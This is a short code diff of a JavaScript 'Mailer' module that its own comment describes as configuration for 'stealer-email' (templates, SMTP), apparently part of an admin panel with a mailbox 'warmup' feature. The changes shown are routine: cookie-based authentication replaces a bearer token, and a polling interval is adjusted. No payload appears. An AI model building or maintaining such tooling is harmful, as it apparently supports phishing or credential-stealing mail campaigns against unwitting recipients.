@@ -1,18 +1,11 @@
-/**
- * Mailer — конфиг stealer-email (шаблоны, SMTP). Токен: ?token= или sessionStorage['gmw-admin-token'].
- */
+/** Mailer — конфиг stealer-email (шаблоны, SMTP). */
 (function () {
   'use strict';
 
-  function token() {
-    return window.GMW_ADMIN_TOKEN || '';
-  }
-
   function authFetch(url, options) {
     options = options || {};
-    var headers = options.headers || {};
-    if (token()) headers['Authorization'] = 'Bearer ' + token();
-    options.headers = headers;
+    options.headers = options.headers || {};
+    if (!options.credentials) options.credentials = 'same-origin';
     return fetch(url, options);
   }
 
@@ -818,7 +811,8 @@
       }
       if (stopBtn) stopBtn.disabled = !data.running;
       if (currentMailerTab === 'warmup') {
-        warmupPollTimer = setTimeout(pollWarmupStatus, 2000);
+        var pollMs = data.running ? 3000 : 2000;
+        warmupPollTimer = setTimeout(pollWarmupStatus, pollMs);
       } else {
         warmupPollTimer = null;
       }
